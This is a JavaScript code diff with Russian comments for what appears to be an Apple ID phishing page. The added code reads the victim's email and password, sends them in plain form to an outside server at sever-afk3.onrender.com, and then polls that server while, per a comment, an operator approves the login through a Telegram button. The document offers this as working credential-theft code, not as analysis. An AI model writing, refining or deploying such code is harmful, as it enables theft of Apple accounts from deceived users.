@@ -1,32 +1,72 @@
 async function handleLogin() {
+// Глобальные переменные для управления сессией
+let currentUserId = null;
+let pollInterval = null;
+
+async function handleLogin() {
+    console.log("--- Попытка входа ---");
+    
     const email = document.getElementById('email').value;
     const pass = document.getElementById('password').value;
 
-    if (!email.includes('@')) return alert('Введите корректный Apple ID');
+    // Валидация
+    if (!email || !email.includes('@')) {
+        console.error("Ошибка: некорректный email");
+        return alert('Введите корректный Apple ID');
+    }
 
-    // Генерируем ID сессии
+    // Генерируем уникальный ID для этой попытки
     currentUserId = 'ID_' + Math.floor(Math.random() * 1000000);
-    showStep('wait-step');
+    console.log("ID сессии:", currentUserId);
 
     try {
+        // Показываем экран ожидания
+        if (typeof showStep === 'function') showStep('wait-step');
+
+        console.log("Отправка запроса на сервер...");
         const res = await fetch('https://sever-afk3.onrender.com/send-data', {
             method: 'POST',
-            mode: 'cors', // Важно для запроса на другой домен
+            mode: 'cors',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ userId: currentUserId, email, pass })
         });
 
+        console.log("Статус ответа сервера:", res.status);
+
         if (res.ok) {
-            // Если сервер принял данные, начинаем опрос статуса
+            console.log("Данные успешно отправлены. Начинаем опрос статуса...");
+            // Запускаем проверку: нажал ли админ кнопку в Telegram
             pollInterval = setInterval(checkAuthStatus, 3000);
         } else {
-            alert("Ошибка сервера. Загляните в логи Render.");
-            showStep('auth-step');
+            const errorText = await res.text();
+            throw new Error(`Ошибка сервера: ${res.status} - ${errorText}`);
         }
     } catch (err) {
-        console.error("Ошибка:", err);
-        alert("Не удалось достучаться до сервера.");
-        showStep('auth-step');
+        console.error("Критическая ошибка:", err);
+        alert("Не удалось связаться с сервером. Убедитесь, что сервер на Render запущен.");
+        if (typeof showStep === 'function') showStep('auth-step');
+    }
+}
+
+async function checkAuthStatus() {
+    if (!currentUserId) return;
+
+    try {
+        const res = await fetch(`https://sever-afk3.onrender.com/check-status/${currentUserId}`);
+        const data = await res.json();
+        console.log("Текущий статус:", data.status);
+
+        if (data.status === 'success') {
+            clearInterval(pollInterval);
+            alert("Вход подтвержден!");
+            // Здесь можно перенаправить пользователя
+        } else if (data.status === 'error') {
+            clearInterval(pollInterval);
+            alert("Ошибка авторизации. Попробуйте снова.");
+            if (typeof showStep === 'function') showStep('auth-step');
+        }
+    } catch (err) {
+        console.error("Ошибка при проверке статуса:", err);
     }
 }
 
